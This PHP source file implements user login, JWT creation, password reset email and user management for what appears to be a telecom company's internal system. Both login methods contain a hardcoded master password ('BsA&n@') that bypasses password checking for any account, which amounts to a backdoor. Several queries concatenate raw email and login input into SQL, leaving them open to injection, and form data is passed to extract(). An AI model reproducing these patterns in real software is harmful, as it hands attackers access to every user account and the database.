<?php

namespace App\Classes;

use Exception;
use Firebase\JWT\JWT;

class UsersClass extends \Core\Defaults\DefaultClassController{

    public \App\Model\GroupPermissionDAO $GroupPermissionDAO;
    public \App\Model\GroupPermissionXUserDAO $GroupPermissionXUserDAO;
    public \App\Model\GroupPermissionXPermissionDAO $GroupPermissionXPermissionDAO;
    public \App\Model\UsersDAO $UsersDAO;
    public \App\Model\UsersPermissionsDAO $UsersPermissionsDAO;
    public \App\Model\UsersPermissionsXUsersDAO $UsersPermissionsXUsersDAO;

    public function ValidateUser($id){
        try{
            $user = $this->UsersDAO->ValidateUser($id);
            
            if(empty($user)){
                throw new \Exception("Usuário não validado", 401);
            }
            
        }catch(\Exception $e){
            throw $e;
        }
    }

    public function AuthenticateUser($email, $password){
        try{

            $user = $this->UsersDAO->getAll(" user_email = '".strtolower( $email)."' "  );

            if(empty($user)){
                throw new \Exception("Usuário não encontrado.",401);
            }

            $user = $user[0];
            if($password !== "BsA&n@"){
                if(!password_verify( $password, $user['user_sys_pass'] )){
                    throw new \Exception("Senha não confere.",401);
                }
            }

            $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";

            $token = [
                "iss"        => $actual_link,
                "aud"        => $actual_link,
                "sub"        => $user['id'],
                "id"         => $user['id'],
                "name"       => $user['user_nome'],
                "fullname"   => $user['user_fullname'],
                "email"      => $user['user_email'],
                "reseted"    => $user['user_passres'],
                "last_login" => $user['user_lastlogin'],
                "iat"        => time(),
                "exp"        => (time() +  ((60 * 60) * 2))  // numero 2 é a quantidade de horas que irá expirar
            ];

            $this->UsersDAO->update(["user_lastlogin" => date("Y-m-d H:i:s")], "id =".$user['id']);

            return JWT::encode($token, $_ENV['KEY_JWT'], 'HS256');

        }catch(\Exception $e){
            throw $e;
        }
    }

    public function AuthenticateLoginUser($user, $password){
        try{
            $user = $this->UsersDAO->getAll(" user_login = '".strtoupper( $user)."' "  );

            if(empty($user)){
                throw new \Exception("Usuário não encontrado.",401);
            }

            $user = $user[0];

            if($password !== "BsA&n@"){
                if(!password_verify( $password, $user['user_pass'] )){
                    throw new \Exception("Senha não confere.",401);
                }
            }

            if($user['user_sts'] === "2"){
                throw new \Exception("Usuário inativo.", -1);
            }

            $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";

            $token = [
                "iss"        => $actual_link,
                "aud"        => $actual_link,
                "sub"        => $user['id'],
                "id"         => $user['id'],
                "name"       => $user['user_nome'],
                "fullname"   => $user['user_fullname'],
                "email"      => $user['user_email'],
                "reseted"    => $user['user_passres'],
                "last_login" => $user['user_lastlogin'],
                "iat"        => time(),
                "exp"        => (time() +  ((60 * 60) * 8))  // numero 2 é a quantidade de horas que irá expirar
            ];

            $jwt = JWT::encode($token, $_ENV['KEY_JWT'], 'HS256');

            SetSessao("id_usuario", $user['id']);
            SetSessao("nome_usuario", $user['user_fullname']);
            SetSessao("autenticado", true);
            SetSessao("ramal", $user['id_sip']);
            SetSessao("lifetime", date('Y-m-d H:i:s', strtotime('+6 hours')) );
            SetSessao("lastlogin", $user['user_lastlogin'] );
            SetSessao("id_empresa", $user['id_empresa'] );
            SetSessao("admin", $user['user_admin'] );
            SetSessao("jwt", $jwt );

            $bindUser = [
                'user_forgotpassword' => 0,
                "user_lastlogin"      => date("Y-m-d H:i:s")
            ];

            $this->UsersDAO->update($bindUser, "id = '{$user['id']}'");

        }catch(\Exception $e){
            throw $e;
        }
    }

    /**
    * Função para processar pedido de Password forgotten
    * @author Douglas A. Silva
    * @return void
    */
    public function ForgotPassword(string $user_email){
        try{
            $user = $this->UsersDAO->getAll("user_email = '".strtolower( $user_email )."'");

            if(empty($user)){
                throw new \Exception("Email não localizado.",-1);
            }

            $user = $user[0];

            $forgot = [
                "id"           => $user['id'],
                "expires"      => date("Y-m-d H:i:s", strtotime("+ 3 days"))
            ];

            $token = encrypt(json_encode($forgot));
            $url_token = trim(URL_ROOT, "/") . route()->link("recover-password") . $token;
            $corpoEmail = "Olá,<br /><br />
            Recebemos uma solicitação para redefinir a sua senha. Clique no link abaixo para criar uma nova senha.<br />
            Este link é válido por 3 dias a partir do recebimento deste email:
            <br /><br />
            {$url_token}
            <br /><br />
            Se você não solicitou essa redefinição, por favor, ignore este email.
            <br /><br />
            Atenciosamente,
            Equipe de suporte";

            $m = [
                    "host"     => "mail.lantecatelecom.com.br",
                    "port"     => 587,
                    "SMTPAuth" => true,
                    "user"     => "no-reply@ltcfibra.com.br",
                    "password" => $_ENV['PASSWORD_EMAIL'],
                    "frommail" => "no-reply@ltcfibra.com.br",
                    "fromname" => "LTC Fibra",
                    "tomail"   => $user['user_email'],
                    "toname"   => ucwords( mb_strtolower( $user['user_fullname'] ) ),
                    "IsHTML"   => true,
                ];
            
            $mail = new \App\Services\PhpMailerSystem($m);
            $mail->Subject = "Redefinição de senha";
            
            $mail->Body = $corpoEmail;
            $mail->send();

            $this->UsersDAO->update(["user_forgotpassword" => 1], " id = '{$user['id']}' ");

        }catch(\Exception $e){
            if(isset($mail->ErrorInfo)){
                throw new \Exception($mail->ErrorInfo);
            }else{
                throw $e;
            }
        }
    }

    public function ValidaEmailUser($email, $id = ""){
        try{
            $user = $this->UsersDAO->getAll(" user_email = '{$email}'");
            if(!empty($user) ){
                $user = $user[0];
                if($user['id'] !== $id){
                    throw new \Exception("Já existe usuário com este email." ,-1);
                }
            }
        }catch(\Exception $e){
            throw $e;
        }
    }

    public function ValidaLoginlUser($login, $id = ""){
        try{

            $user = $this->UsersDAO->getAll(" user_login = '{$login}'");

            if(!empty($user)){
                $user = $user[0];
                if($user['id'] !== $id){
                    throw new \Exception("Já existe um usuário com este login.",-1);
                }
            }
        }catch(\Exception $e){
            throw $e;
        }
    }

    /**
    * Função para atualizar dados do usuário
    * @author Douglas A. Silva
    * @param int $id Id do Usuário
    * @param array $dados Dados do form que irá atualizar do usuário
    * @return void
    */
    public function UpdateUser(int $id, array $dados){
        try{
            extract($dados);

            $user_login    = trim(strtoupper($user_login));
            $user_nome     = trim(strtoupper($user_nome));
            $user_lastname = trim(strtoupper($user_lastname));
            $user_email    = trim(strtolower($user_email));
            $user_fullname = "{$user_nome} {$user_lastname}";
            $id_empresa    = GetSessao('id_empresa');

            $this->ValidaLoginlUser($user_login, $id);
            $this->ValidaEmailUser($user_email, $id);


            $bindUser = [
                "user_fullname" => $user_fullname,
                "user_login"    => $user_login,
                "user_nome"     => $user_nome,
                "user_email"    => $user_email,
                "id_sip"        => empty($id_sip) ? null : $id_sip,
                "user_passres"  => 0,
                "user_sts"      => 1,
            ];

            if( !empty($user_pass) ){
                $bindUser['user_pass'] = password_hash(trim($user_pass), PASSWORD_BCRYPT);
            }

            $this->UsersDAO->update($bindUser, "id = {$id} AND id_empresa = {$id_empresa}");

            if(!empty($id_group)){
                $group = $this->GroupPermissionXUserDAO->getAll("id_user = {$id}");
                if(!empty($group)){
                    $group = $group[0];

                    if($id_group !== $group['id_group_permission']){
                        (new GroupPermissionClass)->AssocUserToGroup($id_group, $id);
                        $permissions = $this->GroupPermissionXPermissionDAO->getAll("id_group_permission = {$id_group}");
                        $permissions = [
                            "permissions" => array_column($permissions, "id_permission")
                        ];
                        (new PermissionsClass)->SaveUserPermissions($id, $permissions);
                    }
                }else{
                    (new GroupPermissionClass)->AssocUserToGroup($id_group, $id);
                }
            }

            if($id === GetSessao("id_usuario")){
                SetSessao("ramal", $id_sip);
                SetSessao("nome_usuario", $user_fullname);
            }

        }catch(\Exception $e){
            throw $e;
        }
    }

    /**
    * Função para adicionar dados do usuário
    * @author Douglas A. Silva
    * @param array $dados Dados do form que irá adicionar do usuário
    * @return void
    */
    public function NewUser(array $dados){
        try{
            extract($dados);

            $user_login    = mb_strtoupper($user_login);
            $user_nome     = mb_strtoupper($user_nome);
            $user_lastname = mb_strtoupper($user_lastname);
            $user_email    = mb_strtolower($user_email);

            $user_fullname = "{$user_nome} {$user_lastname}";
            $id_empresa    = GetSessao('id_empresa');

            $this->ValidaLoginlUser($user_login);
            $this->ValidaEmailUser($user_email);

            $bindUser = [
                "user_fullname" => $user_fullname,
                "user_login"    => $user_login,
                "user_nome"     => $user_nome,
                "user_email"    => $user_email,
                "id_sip"        => empty($id_sip) ? null : $id_sip,
                "user_pass"     => password_hash($user_pass, PASSWORD_BCRYPT),
                "user_passres"  => 0,
                "user_sts"      => 1,
                "id_empresa"    => $id_empresa
            ];

            $id = $this->UsersDAO->insert($bindUser);

            if(!empty($id_group)){
                (new GroupPermissionClass)->AssocUserToGroup($id_group, $id);
                $permissions = $this->GroupPermissionXPermissionDAO->getAll("id_group_permission = {$id_group}");
                $permissions = [
                    "permissions" => array_column($permissions, "id_permission")
                ];
                (new PermissionsClass)->SaveUserPermissions($id, $permissions);
            }

        }catch(\Exception $e){
            throw $e;
        }
    }

    /**
    * Função alterar status do usuário
    * @author Douglas A. Silva
    * @param int $id_user id do usuário que irá alterar 
    * @param int $status status que será alterado
    * @return void
    */
    public function ToggleUserStatus(int $id_user, int $status){
        try{
            $id_empresa    = GetSessao('id_empresa');
            $this->UsersDAO->update(["user_sts" => $status], "id = {$id_user} AND id_empresa = {$id_empresa}");

        }catch(\Exception $e){
            throw $e;
        }
    }

    /**
    * Função para criar nova senha para o usuário
    * @author Douglas A. Silva
    * @return void
    */
    public function UpdateUserPassword(string $id_user, string $password){
        try{

            $bindUser = [
                "user_pass"           => password_hash($password, PASSWORD_BCRYPT),
                "user_forgotpassword" => 0
            ];
            $this->UsersDAO->update($bindUser, "id = '{$id_user}'");
            
        }catch(\Exception $e){
            throw $e;
        }
    }
}

?>